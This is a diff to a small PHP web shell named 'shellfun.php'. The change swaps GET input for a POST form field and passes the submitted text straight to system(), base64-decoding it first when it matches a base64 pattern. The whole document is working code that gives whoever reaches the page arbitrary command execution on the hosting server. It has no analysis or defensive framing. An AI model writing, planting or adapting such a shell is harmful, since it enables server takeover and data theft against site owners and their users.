@@ -2,21 +2,26 @@
 
 // shellfun.php
 // WSTN
-// 2015-04-20
+// 2015-04-21
 
 
 //@error_reporting(0);
 
 
 // run system commands
-empty($_GET['cmd']) ? print '<strong>no shell command passed</strong>' : print '<strong>command: ' . htmlentities($_GET['cmd']) . '</strong>';
+echo '<strong>shell command</strong><br><br>';
+echo '<form action="" method="post">';
+echo '  <input type="text" name="sys_cmd">';
+echo '  <input type="submit" name="sub_cmd" value="system cmd">';
+echo '</form>';
+
 echo '<pre>';
 $b64_regex = '#^[A-Za-z0-9+/]+={0,2}$#';
-if (isset($_GET['cmd'])) {
-    if (preg_match($b64_regex, $_GET['cmd'])) {
-        system(base64_decode($_GET['cmd']));
+if (isset($_POST['sys_cmd'])) {
+    if (preg_match($b64_regex, $_POST['sys_cmd'])) {
+        system(base64_decode($_POST['sys_cmd']));
     } else {
-        system($_GET['cmd']);
+        system($_POST['sys_cmd']);
     }
 }
 echo '</pre><br><hr><br>';
